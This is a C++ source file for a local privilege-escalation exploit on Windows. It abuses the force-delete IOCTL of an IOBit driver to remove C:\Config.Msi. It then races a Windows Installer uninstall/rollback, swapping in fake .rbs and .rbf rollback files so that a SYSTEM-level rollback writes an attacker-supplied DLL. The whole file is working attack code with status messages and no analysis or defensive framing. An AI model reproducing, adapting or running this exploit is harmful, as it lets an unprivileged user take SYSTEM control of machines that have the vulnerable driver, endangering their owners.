#include "Header.h"
const wchar_t* MsiFolderName = LR"(\??\C:\Config.msi)";
const wchar_t* RbsFileName = LR"(\??\C:\Config.msi\5eeabb3.rbf)";

const char* strDeviceName = R"(\\.\IMFForceDelete123)";

int ArbDeleteFileFolder(wchar_t* dummyFile) {

	DWORD dwReturnVal = 0;
	DWORD dwBytesReturned = 0;
	BOOL bRes = FALSE;


	HANDLE hDevice = CreateFileA(
		strDeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);


	if (!hDevice || hDevice == INVALID_HANDLE_VALUE) { 
		printf("[-] IOBIT is not installed on this device, exiting...\n");
		exit(-1);
	}

	bRes = DeviceIoControl(
		hDevice,
		0x8016E000,
		(LPVOID)dummyFile,
		lstrlenW(dummyFile) * sizeof(wchar_t),
		&dwReturnVal,
		sizeof(DWORD),
		&dwBytesReturned,
		NULL
	);

	if (!(bRes && dwReturnVal)) {
		printf("[-] Folder/File does not exist.\n");
		CloseHandle(hDevice);
		return GetLastError();
	}

	printf("[*] Folder/File Deleted successfully\n");
	return 0;
}


bool bitnessCheck()
{
	auto fakeRbf = Resources::instance().fakeRbf().data();
	int dllBitness =
		*(unsigned __int16*)(fakeRbf + *(__int32*)(fakeRbf + 0x3c) + 4)
			== 0x8664 ? 64 : 32;

	SYSTEM_INFO systemInfo;
	GetNativeSystemInfo(&systemInfo);
	int systemBitness = systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? 64 : 32;

	return dllBitness == systemBitness;
}

std::wstring uniqueString()
{
	UUID u;
	UuidCreate(&u);

	RPC_WSTR su;
	UuidToString(&u, &su);

	std::wstring result((PCWSTR)su);

	RpcStringFree(&su);

	return result;
}

std::wstring createUniqueTempFolder()
{
	WCHAR tempFolder[MAX_PATH + 1];
	GetEnvironmentVariable(L"TEMP", tempFolder, _countof(tempFolder));

	WCHAR result[MAX_PATH + 1];
	PathCchCombine(result, _countof(result), tempFolder, uniqueString().c_str());

	CreateDirectory(result, NULL);

	return result;
}

class TempMsi
{
public:
	TempMsi()
	{
		auto msi = Resources::instance().msi();
		tempMsiPath = L"C:\\Windows\\Temp\\" + uniqueString();
		HANDLE hMsi = CreateFile(
			tempMsiPath.c_str(),
			GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
			0, NULL);
		DWORD dwNumberOfBytesWritten;
		WriteFile(hMsi, msi.data(), msi.size(), &dwNumberOfBytesWritten, NULL);
		CloseHandle(hMsi);
	}
	TempMsi(TempMsi&) = delete;
	TempMsi& operator =(TempMsi&) = delete;
	~TempMsi()
	{
		DeleteFile(tempMsiPath.c_str());
	}
	std::wstring GetTempMsiPath() { return tempMsiPath; }
private:
	std::wstring tempMsiPath;
};

bool get_configMsiExists()
{
	return GetFileAttributes(L"C:\\Config.Msi") != INVALID_FILE_ATTRIBUTES;
}

bool get_configMsiIsRegistered()
{
	bool configMsiRegistered = false;
	HKEY hkeyInstallerFolders;
	if (RegOpenKeyEx(
		HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\Folders",
		0,
		KEY_QUERY_VALUE,
		&hkeyInstallerFolders) == ERROR_SUCCESS)
	{
		if (
			RegQueryValueEx(hkeyInstallerFolders, L"C:\\Config.Msi\\", NULL, NULL, NULL, NULL)
			== ERROR_SUCCESS
			||
			RegQueryValueEx(hkeyInstallerFolders, L"C:\\Config.Msi", NULL, NULL, NULL, NULL)
			== ERROR_SUCCESS)
		{
			configMsiRegistered = true;
		}
		RegCloseKey(hkeyInstallerFolders);
	}

	return configMsiRegistered;
}

bool tryDeleteConfigMsi()
{
	SHFILEOPSTRUCT fileOp;
	fileOp.hwnd = NULL;
	fileOp.wFunc = FO_DELETE;
	fileOp.pFrom = L"C:\\Config.Msi\0";
	fileOp.pTo = NULL;
	fileOp.fFlags = FOF_NO_UI;

	if (SHFileOperation(&fileOp) == 0
		&& !fileOp.fAnyOperationsAborted)
	{
		return true;
	}
	else
	{
		return false;
	}
}

void spinUntilConfigMsiDeleted()
{

	while (GetFileAttributes(L"C:\\Config.Msi") != INVALID_FILE_ATTRIBUTES)
	{
		ArbDeleteFileFolder((wchar_t*)MsiFolderName);

		Sleep(200);
	}
}

void install(const std::wstring& installPath) {
	TempMsi tempMsi;
	MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
	MsiInstallProduct(
		tempMsi.GetTempMsiPath().c_str(),
		(L"ACTION=INSTALL TARGETDIR=" + installPath).c_str());
}

void installWithRollback(const std::wstring& installPath) {
	CreateDirectory(installPath.c_str(), NULL);
	TempMsi tempMsi;
	MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
	MsiInstallProduct(
		tempMsi.GetTempMsiPath().c_str(),
		(L"ACTION=INSTALL ERROROUT=1 TARGETDIR=" + installPath).c_str());
}

void uninstall() {
	TempMsi tempMsi;
	MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
	MsiInstallProduct(
		tempMsi.GetTempMsiPath().c_str(),
		L"REMOVE=ALL");
}

DWORD WINAPI thread_uninstall(PVOID)
{
	uninstall();
	return 0;
}

DWORD WINAPI thread_installWithRollback(PVOID installPath)
{
	do
	{
		HANDLE hFileToBeDetected = CreateFile(
			(L"C:\\Config.Msi\\" + uniqueString()).c_str(),
			GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_FLAG_DELETE_ON_CLOSE, NULL);
		CloseHandle(hFileToBeDetected);
		Sleep(100);
	} while (!stage2FilesystemChangeDetected);

	installWithRollback((const wchar_t*)installPath);
	return 0;
}

void stage1()
{
	uninstall();

	auto installPath = createUniqueTempFolder();
	install(installPath.c_str());

	auto dummyFilePath = installPath + L"\\dummy.txt";
	HANDLE hFileDummy = CreateFile(
		dummyFilePath.c_str(),
		FILE_READ_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING,
		0, NULL);
	if (!hFileDummy)
	{
		std::wcout << L"[-] " << std::wstring(dummyFilePath) << L" didn't install, exiting" << std::endl;
		exit(1);
	}

	HANDLE hEvent_RbfFullyWritten = CreateEvent(NULL, FALSE, FALSE, L"FolderOrFileDeleteToSystem_RbfFullyWritten");
	ResetEvent(hEvent_RbfFullyWritten);
	HANDLE hEvent_ReadyForAttemptedDelete = CreateEvent(NULL, FALSE, FALSE, L"FolderOrFileDeleteToSystem_ReadyForAttemptedDelete");
	ResetEvent(hEvent_ReadyForAttemptedDelete);

	HANDLE hUninstallThread = CreateThread(NULL, NULL, thread_uninstall, NULL, NULL, NULL);

	WCHAR updatedFilePath[MAX_PATH + 1];
	for (;;)
	{
		DWORD len = GetFinalPathNameByHandle(
			hFileDummy,
			updatedFilePath,
			_countof(updatedFilePath),
			FILE_NAME_NORMALIZED | VOLUME_NAME_DOS);
		const WCHAR configMsiPrefix[] = L"\\\\?\\C:\\Config.Msi\\";
		constexpr size_t configMsiPrefixLen = _countof(configMsiPrefix) - 1;
		if (len >= configMsiPrefixLen && !_wcsnicmp(updatedFilePath, configMsiPrefix, configMsiPrefixLen))
		{
			break;
		}
		Sleep(100);
	}
	CloseHandle(hFileDummy);

	if (WaitForSingleObject(hEvent_RbfFullyWritten, INFINITE) == 30000)
	{
		std::cout << "[-] FAILED: Timeout waiting for uninstall to set event FolderOrFileDeleteToSystem_RbfFullyWritten." << std::endl;
		SetEvent(hEvent_ReadyForAttemptedDelete);
		exit(1);
	}

	HANDLE hFileRbf = CreateFile(
		&updatedFilePath[4],
		GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
		0, NULL);

	// Allow the uninstaller to run to completion
	SetEvent(hEvent_ReadyForAttemptedDelete);
	CloseHandle(hEvent_RbfFullyWritten);
	CloseHandle(hEvent_ReadyForAttemptedDelete);
	if (WaitForSingleObject(hUninstallThread, 120000) == WAIT_TIMEOUT)
	{
		std::cout << "[-] FAILED: Timeout waiting for uninstall to complete." << std::endl;
		exit(1);
	}

	FILE_DISPOSITION_INFO fdi;
	fdi.DeleteFileW = TRUE;
	SetFileInformationByHandle(hFileRbf, FileDispositionInfo, &fdi, sizeof(fdi));
	CloseHandle(hFileRbf);
}

void stage2()
{

	HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
	auto NtSetSecurityObject = (NTSTATUS(WINAPI*)(
		HANDLE               Handle,
		SECURITY_INFORMATION SecurityInformation,
		PSECURITY_DESCRIPTOR SecurityDescriptor
		))GetProcAddress(ntdll, "NtSetSecurityObject");

	SECURITY_DESCRIPTOR sd;
	InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = &sd;
	sa.bInheritHandle = FALSE;

	CreateDirectory(L"C:\\Config.Msi", &sa);
	HANDLE hConfigMsi = CreateFile(
		L"C:\\Config.Msi",
		GENERIC_READ | READ_CONTROL | WRITE_DAC | FILE_DELETE_CHILD,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

	const size_t fileNotifyBufferLen = 0x100000;
	BYTE* fileNotifyBuffer = (BYTE*)malloc(fileNotifyBufferLen);


	HANDLE hEvent_RbsFullyWritten = CreateEvent(NULL, FALSE, FALSE, L"FolderOrFileDeleteToSystem_RbsFullyWritten");
	ResetEvent(hEvent_RbsFullyWritten);
	HANDLE hEvent_ReadyForRollback = CreateEvent(NULL, FALSE, FALSE, L"FolderOrFileDeleteToSystem_ReadyForRollback");
	ResetEvent(hEvent_ReadyForRollback);

	stage2FilesystemChangeDetected = false;

	auto installPath = createUniqueTempFolder();
	HANDLE hInstallThread = CreateThread(NULL, NULL, thread_installWithRollback, (PVOID)installPath.c_str(), NULL, NULL);

	std::wstring rbsFileName;
	do {
		DWORD dwBytesReturned;
		if (!ReadDirectoryChangesW(
			hConfigMsi,
			fileNotifyBuffer,
			fileNotifyBufferLen,
			FALSE,
			FILE_NOTIFY_CHANGE_FILE_NAME,
			&dwBytesReturned, NULL, NULL))
		{
			std::wcout << L"[-] FAILED: Failed to detect creation of an .rbs file." << std::endl;
			exit(1);
		}
		stage2FilesystemChangeDetected = true;
		BYTE* fileNotifyInfoBytePtr = fileNotifyBuffer;
		for (;;)
		{
			FILE_NOTIFY_INFORMATION* fileNotifyInfo = (FILE_NOTIFY_INFORMATION*)fileNotifyInfoBytePtr;
			if (fileNotifyInfo->Action == FILE_ACTION_ADDED &&
				fileNotifyInfo->FileNameLength / 2 >= 4 &&
				!_wcsnicmp(
					&fileNotifyInfo->FileName[fileNotifyInfo->FileNameLength / 2 - 4],
					L".rbs",
					4))
			{
				rbsFileName = L"C:\\Config.Msi\\";
				rbsFileName.append(fileNotifyInfo->FileName, fileNotifyInfo->FileNameLength / 2);
				break;
			}
			else if (!fileNotifyInfo->NextEntryOffset)
			{
				break;
			}
			else
			{
				fileNotifyInfoBytePtr += fileNotifyInfo->NextEntryOffset;
			}
		}
	} while (!rbsFileName.length());

	if (WaitForSingleObject(hEvent_RbsFullyWritten, 120000) == WAIT_TIMEOUT)
	{
		std::cout << "[-] FAILED: Timeout waiting for FolderOrFileDeleteToSystem_RbsFullyWritten event." << std::endl;
		exit(1);
	}

	NtSetSecurityObject(hConfigMsi, DACL_SECURITY_INFORMATION, &sd);

	if (!DeleteFile(rbsFileName.c_str()))
	{
		std::cout << "[-] Failed to delete .rbs file. Error: 0x"
			<< std::hex << GetLastError() << std::dec << std::endl;
		exit(1);
	}

	HANDLE hRbs = CreateFile(
		rbsFileName.c_str(),
		GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS,
		0, NULL);
	auto fakeRbs = Resources::instance().fakeRbs();
	DWORD dwNumberOfBytesWritten;
	WriteFile(hRbs, fakeRbs.data(), fakeRbs.size(), &dwNumberOfBytesWritten, NULL);
	CloseHandle(hRbs);

	HANDLE hRbf = CreateFile(
		L"C:\\Config.Msi\\5eeabb3.rbf",
		GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS,
		0, NULL);
	auto fakeRbf = Resources::instance().fakeRbf();
	WriteFile(hRbf, fakeRbf.data(), fakeRbf.size(), &dwNumberOfBytesWritten, NULL);
	CloseHandle(hRbf);

	SetEvent(hEvent_ReadyForRollback);
	CloseHandle(hEvent_RbsFullyWritten);
	CloseHandle(hEvent_ReadyForRollback);
	CloseHandle(hConfigMsi);
	if (WaitForSingleObject(hInstallThread, 120000) == WAIT_TIMEOUT)
	{
		std::cout << "[-] FAILED: Timeout waiting for install/rollback to complete." << std::endl;
		exit(1);
	}
	CloseHandle(hInstallThread);

	

	std::wcout << L"[+] Done." << std::endl;
}

int main(int argc, const char* argv[])
{
	bool stage1Only = false;

	printf("[*] Cleaning up existing MSI folder and RBS file :) ...\n");

	ArbDeleteFileFolder((wchar_t*)MsiFolderName);

	ArbDeleteFileFolder((wchar_t*)RbsFileName);


	if (!bitnessCheck())
	{
		std::wcout << L"[-] ERROR: This exploit was not compiled with correct bitness for this system." << std::endl;
		std::wcout << L"[-] Exiting." << std::endl;
		return (-1);
	}


	bool configMsiExists = get_configMsiExists();
	
	bool configMsiIsRegistered = get_configMsiIsRegistered();

	stage1();

	spinUntilConfigMsiDeleted();

	std::cout << "[+] C:\\Config.Msi has been deleted." << std::endl;

	std::cout << "[+] Proceeding with Stage 2." << std::endl;

	stage2();

	return 0;
}
